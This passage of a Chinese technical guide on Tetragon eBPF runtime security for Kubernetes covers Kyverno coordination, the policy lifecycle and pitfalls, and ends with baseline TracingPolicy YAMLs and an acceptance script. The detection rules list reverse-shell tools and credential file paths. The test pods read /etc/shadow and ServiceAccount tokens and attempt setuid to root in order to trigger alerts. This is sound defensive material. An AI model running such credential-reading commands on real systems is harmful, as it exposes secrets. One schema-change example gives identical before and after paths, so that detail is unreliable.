实际我倾向在新集群里直接上 Tetragon。主要原因是：GitOps 管理 CRD 比管理 falco 配置文件顺手，而且一旦未来要做 enforcement，不用再换一套工具。

## 十六、与 Admission Control 的协同

运行时安全不是万能的。它是**最后一道防线**，前面还有 Kyverno/OPA 这一层。两者要怎么分工：

### 16.1 典型 Kyverno 规则（准入）

- 禁止 `privileged: true`
- 禁止 `hostPID`、`hostNetwork`、`hostIPC`
- 禁止 `runAsUser: 0`
- 强制只允许从内部 registry 拉镜像
- 强制 resource requests/limits
- 禁止 `allowPrivilegeEscalation: true`

这些是**静态的**，Kyverno 在 admission 阶段就能挡住违规 Pod。

### 16.2 Tetragon 补位

- 如果开发用白名单 exception 申请了 privileged Pod，Tetragon 负责监控它的 capset、setns、pivot_root 等行为
- 即使镜像干净，仍然能检测运行时加载的恶意 binary
- 监控 ServiceAccount token 的异常读取，补齐 Kyverno 管不到的动态行为

### 16.3 一个现实的例子

数据科学团队申请了一个 hostPath 挂载 `/dev/nvidia0` 的 GPU Pod。Kyverno 基线允许这种 Pod（已经走了审批例外），但 Tetragon 会针对该 Pod 命名空间下发一条额外 policy，监控 `/dev/` 下的任何非 GPU 设备访问。一旦这个 Pod 尝试 open `/dev/kmem`、`/dev/mem`，立即告警+kill。

## 十七、运营规则生命周期

规则不是写完丢那里就行，它需要一个生命周期。

### 17.1 阶段

1. **草稿**：写出 TracingPolicy YAML，先在本地 kind/minikube 验证。
2. **灰度**：在 staging ns 下发 namespaced policy，只观测不阻断，跑至少 1 周，收集误报。
3. **调优**：根据误报调整 selector。常见的调优点是加 `matchBinaries` 白名单、把业务 Pod 的合法路径排除掉。
4. **推全**：集群级 policy 下发，继续 report-only 一周。
5. **enforcement**：加 Sigkill/override action，正式启用阻断。
6. **退役**：业务场景变化后规则需要更新或下线，避免规则墓地。

### 17.2 GitOps 管理

所有 TracingPolicy 放 Git 仓库，目录按：

```
tetragon-policies/
├── base/
│   ├── process-exec-audit.yaml
│   ├── reverse-shell-detect.yaml
│   ├── sensitive-file-access.yaml
│   ├── container-escape.yaml
│   ├── privilege-escalation.yaml
│   └── kustomization.yaml
├── overlays/
│   ├── web-cluster/
│   │   └── kustomization.yaml
│   └── data-cluster/
│       ├── gpu-pod-hostdev.yaml
│       └── kustomization.yaml
```

ArgoCD Application sync 这个仓库，policy 变更跟随 PR merge 自动推到对应集群。关键是**每一条 policy 都要有一个对应的测试用例**（攻击命令 + 期望事件），写在 README 里，回归用。

### 17.3 误报率评估

用 Prometheus 埋点跟踪每条 policy 的触发速率：

```
sum by (policy, cluster) (rate(tetragon_policy_events_total[1h]))
```

如果某条 policy 一天触发几千次且全都是误报，说明 selector 写得太宽，回到阶段 3 重调。

## 十八、坑位合集

### 18.1 ring buffer 溢出

**症状**：`tetragon_ringbuf_events_lost_total` 持续上升，SIEM 看到的事件数量波动剧烈，攻击复现但 Tetragon 没报。

**原因**：事件产生速率 > 用户态消费速率，老事件被覆盖。

**解决**：

- 缩减 selector，降低事件生成量
- 增大 perCpuRb 容量（Helm `tetragon.ringBufferSize`）
- agent CPU limit 放宽，不要设过小
- 重的场景给 agent 单独放在不被业务 cgroup 抢的核上（cpuset）

### 18.2 kernel 版本限制

- LSM BPF 需要 5.7+，某些 EL 系发行版的 4.18 根本跑不了
- override return 需要 `CONFIG_BPF_KPROBE_OVERRIDE=y`
- BTF 依赖 `CONFIG_DEBUG_INFO_BTF=y`，没开的话 Tetragon 要自己塞 BTF 文件，部署前一定要验证

**处理**：部署前跑 `uname -r` + `zcat /proc/config.gz | grep BPF`，建立一个集群 kernel 矩阵表。

### 18.3 selector 写错导致全局采集打爆 CPU

**症状**：policy apply 后节点 CPU 飙到 80%。

**原因**：selector 没生效（写错字段名、operator 大小写、matchBinaries 路径不精确），所有事件都上报。

**例子**：`matchBinary`（漏写 s）Tetragon 不会报错，就是不匹配，结果变成无 selector。

**处理**：apply 前本地 `tetra tracingpolicy verify` 静态校验，并且 CI 里跑 schema lint。

### 18.4 namespace 过滤失效

**症状**：`TracingPolicyNamespaced` 在 ns A 下发，发现 ns B 的事件也报上来了。

**原因**：hostNetwork/hostPID Pod 的 ns 识别有 corner case；或者 hook 挂在全局 kprobe，本身不区分 ns，namespaced 语义仅对“事件导出到哪个 ns 的订阅者”起作用。

**处理**：在 selector 里显式加 `matchNamespaces`，不要只依赖 CRD 的作用域。

### 18.5 事件 JSON schema 变更

Tetragon 不同版本之间 JSON 字段路径可能变动，例如某版本 `process.pod.container.name` 挪到 `process.pod.container.name`，解析管道写死路径就挂了。

**处理**：升级前 diff 一下示例事件，Promtail/Fluent Bit 的 JSON 路径用变量管理；给下游 index template 做预演。

### 18.6 与 AppArmor/SELinux 冲突

极少数情况下，节点上开了严格的 AppArmor profile，会把 eBPF 程序加载失败的错信息吞掉。`dmesg -T | grep -i apparmor` 检查。

### 18.7 CentOS 7 / RHEL 7 的尴尬

3.10 kernel 跑不起现代 BPF。这类节点要么升级内核，要么换 Falco（Falco 还支持 kmod 后端）。不要硬上。

## 十九、生产落地 checklist

最后给一个可以直接打印贴墙上的 checklist。

### 19.1 上线前

- [ ] 确认所有节点 kernel ≥ 5.4，关键节点 ≥ 5.10
- [ ] 验证 BTF、CONFIG_BPF_KPROBE_OVERRIDE 开关
- [ ] Helm values 固定版本，记录到 GitOps 仓库
- [ ] agent DaemonSet 的 CPU/内存 request/limit 设置合理，不被 cgroup 打爆
- [ ] 开启 `enableProcessCred` 和 `enableProcessNs`
- [ ] 准备好下游导出管道（Promtail/Fluent Bit → Loki/OpenSearch）
- [ ] Promtail/Fluent Bit label cardinality 评估过，不拿高基数字段做 label
- [ ] 把 ring buffer 相关 metric 接进 Prometheus 告警

### 19.2 Policy 管理

- [ ] 所有 TracingPolicy 版本化在 Git 仓库
- [ ] 目录结构区分 base 和 per-cluster overlay
- [ ] 每条 policy 有对应 README（覆盖场景、误报原因、测试命令）
- [ ] 新 policy 先 report-only 跑 ≥ 1 周
- [ ] enforcement 开关由专门审批流程决定
- [ ] 每条 policy 有触发速率 SLO，超过阈值自动打 issue

### 19.3 事件管道

- [ ] 单节点 NDJSON 文件做轮转压缩，磁盘占用有上限
- [ ] 下游索引/日志保留 ≥ 30 天
- [ ] 建立对接 SIEM 的字段映射表
- [ ] 事件 schema 升级流程有 diff + 预演

### 19.4 人员与流程

- [ ] Oncall 清楚 Tetragon 告警 runbook
- [ ] 规则 ownership 明确：基线规则安全团队维护，业务定制规则业务团队维护
- [ ] 每季度做一次攻防演练，验证规则命中率
- [ ] 退役规则清理机制，避免墓地规则拖累性能

### 19.5 组合拳

- [ ] Kyverno 在准入层挡 privileged/hostPID/hostNetwork
- [ ] Cilium network policy 限制 Pod 出站
- [ ] Tetragon 做运行时检测 + 关键路径阻断
- [ ] Loki/OpenSearch + Grafana/Kibana 做观测面板
- [ ] 镜像扫描 + SBOM 签名完整流水线

## 二十、收尾

Tetragon 把 eBPF 运行时安全做到了今天最接近“内核级 EDR for Kubernetes”的程度。它的三个最大价值：

1. **内核态观测**：攻击者用户态的隐身技巧对它无效
2. **内核态阻断**：不是事后告警，是事发即杀
3. **K8s 原生**：CRD + GitOps + 命名空间隔离，和集群运营融为一体

它也不是银弹。规则需要精心调优，内核版本有门槛，误报治理需要持续投入。但在目前可选的工具里，它是把运行时安全从“高成本被动检测”推向“低成本主动防御”的最强代表。

如果你的集群还没有运行时安全层，Tetragon 是我当前会首先推荐的起点。它不会取代 Kyverno、也不会取代 Cilium，它补齐的是**容器跑起来之后那段最黑的盒子**。这一段黑盒过去被无数团队用 auditd、sysdig、甚至纯日志强撑，今天可以用一套 DaemonSet + 一堆 YAML 解决，这就是 eBPF 给云原生安全带来的最大变化。

写规则、跑演练、看 dashboard，这件事没有终点，只有迭代。把它当作一个长期项目投入，远比当成一次性部署有意义。

## 二十一、附录：一份可直接上线的基线 policy 合集

把前面散落的各条规则合成一个基线，放在集群里跑不会出错。按 report-only 部署，观察一周后再考虑是否打开 enforcement。

```yaml
apiVersion: cilium.io/v1alpha1
kind: TracingPolicy
metadata:
  name: baseline-suspicious-exec
spec:
  kprobes:
    - call: "security_bprm_check"
      syscall: false
      args:
        - index: 0
          type: "linux_binprm"
      selectors:
        - matchBinaries:
            - operator: "In"
              values:
                - "/usr/bin/nc"
                - "/usr/bin/ncat"
                - "/usr/bin/socat"
                - "/usr/bin/nmap"
                - "/usr/bin/tcpdump"
                - "/usr/bin/wget"
                - "/usr/bin/curl"
```

```yaml
apiVersion: cilium.io/v1alpha1
kind: TracingPolicy
metadata:
  name: baseline-reverse-shell
spec:
  kprobes:
    - call: "tcp_connect"
      syscall: false
      args:
        - index: 0
          type: "sock"
      selectors:
        - matchBinaries:
            - operator: "In"
              values:
                - "/bin/bash"
                - "/usr/bin/bash"
                - "/bin/sh"
                - "/usr/bin/sh"
                - "/bin/dash"
                - "/usr/bin/nc"
                - "/usr/bin/ncat"
                - "/usr/bin/socat"
          matchArgs:
            - index: 0
              operator: "NotDAddr"
              values:
                - "127.0.0.0/8"
                - "10.0.0.0/8"
                - "172.16.0.0/12"
                - "192.168.0.0/16"
```

```yaml
apiVersion: cilium.io/v1alpha1
kind: TracingPolicy
metadata:
  name: baseline-sensitive-file
spec:
  kprobes:
    - call: "security_file_open"
      syscall: false
      args:
        - index: 0
          type: "file"
      selectors:
        - matchArgs:
            - index: 0
              operator: "Prefix"
              values:
                - "/etc/shadow"
                - "/etc/gshadow"
                - "/root/.ssh/"
                - "/var/run/secrets/kubernetes.io/serviceaccount/"
                - "/etc/kubernetes/admin.conf"
                - "/proc/self/exe"
                - "/proc/1/root/"
          matchBinaries:
            - operator: "NotIn"
              values:
                - "/usr/bin/kubelet"
                - "/usr/local/bin/kubelet"
                - "/usr/bin/containerd"
                - "/usr/bin/runc"
                - "/usr/bin/containerd-shim-runc-v2"
```

```yaml
apiVersion: cilium.io/v1alpha1
kind: TracingPolicy
metadata:
  name: baseline-priv-escalation
spec:
  kprobes:
    - call: "__x64_sys_setuid"
      syscall: true
      args:
        - index: 0
          type: "int"
      selectors:
        - matchArgs:
            - index: 0
              operator: "Equal"
              values: ["0"]
    - call: "__x64_sys_setgid"
      syscall: true
      args:
        - index: 0
          type: "int"
      selectors:
        - matchArgs:
            - index: 0
              operator: "Equal"
              values: ["0"]
```

```yaml
apiVersion: cilium.io/v1alpha1
kind: TracingPolicy
metadata:
  name: baseline-container-escape
spec:
  kprobes:
    - call: "__x64_sys_setns"
      syscall: true
      args:
        - index: 0
          type: "int"
        - index: 1
          type: "int"
    - call: "__x64_sys_pivot_root"
      syscall: true
      args:
        - index: 0
          type: "string"
        - index: 1
          type: "string"
    - call: "__x64_sys_mount"
      syscall: true
      args:
        - index: 0
          type: "string"
        - index: 1
          type: "string"
        - index: 2
          type: "string"
      selectors:
        - matchBinaries:
            - operator: "NotIn"
              values:
                - "/usr/bin/runc"
                - "/usr/bin/containerd-shim-runc-v2"
```

合计 5 条 policy，是我认为任何一个 Kubernetes 集群最先应该上的运行时安全基线。它们不会产生大量噪音（前提是 selector 准确），却能覆盖 80% 常见攻击动作。

### 21.1 验收脚本

附一个可以直接跑的 bash 脚本，在 `web-cluster` 的测试 ns 里跑一遍，看事件是否都能命中：

```bash
#!/usr/bin/env bash
set -euo pipefail

NS=tetragon-verify
kubectl create ns "$NS" --dry-run=client -o yaml | kubectl apply -f -

kubectl -n "$NS" run t1 --image=busybox --restart=Never --command -- \
  sh -c 'cat /etc/shadow || true; sleep 2'

kubectl -n "$NS" run t2 --image=alpine --restart=Never --command -- \
  sh -c 'apk add --no-cache curl >/dev/null; curl -s https://example.com/ > /dev/null; sleep 2'

kubectl -n "$NS" run t3 --image=busybox --restart=Never --command -- \
  sh -c 'cat /var/run/secrets/kubernetes.io/serviceaccount/token || true; sleep 2'

kubectl -n "$NS" run t4 --image=busybox --restart=Never --command -- \
  sh -c 'setpriv --reuid=0 id || true; sleep 2'

echo "[OK] triggers sent, check tetragon events in the next 30s"
```

每条命令预期会在 Tetragon 的事件流里触发对应的 policy：

| 测试 Pod | 预期命中的 policy |
| --- | --- |
| t1 cat /etc/shadow | baseline-sensitive-file |
| t2 curl external | baseline-reverse-shell（curl 不在列表里时不会命中，验证 matchBinaries 精确性）+ baseline-suspicious-exec |
| t3 cat SA token | baseline-sensitive-file |
| t4 setuid | baseline-priv-escalation |

跑完以后去 Loki / OpenSearch 查对应的事件，如果都命中了，policy 基线就算部署验收通过。

### 21.2 最后一句

运行时安全这件事，写规则只是 20% 的工作量，剩下的 80% 是持续运营——调误报、跟内核版本、对攻击演练、和开发团队拉对齐。eBPF 给了我们一个前所未有强大的观测和阻断能力，Tetragon 把它包装成了 K8s 原生对象，剩下那 80% 的工作量依然是安全团队自己的事。

工具是新的，思路是旧的：**假设系统会被攻破，然后在攻破之后还能看见、还能挡住。** 这就是运行时安全的全部意义。
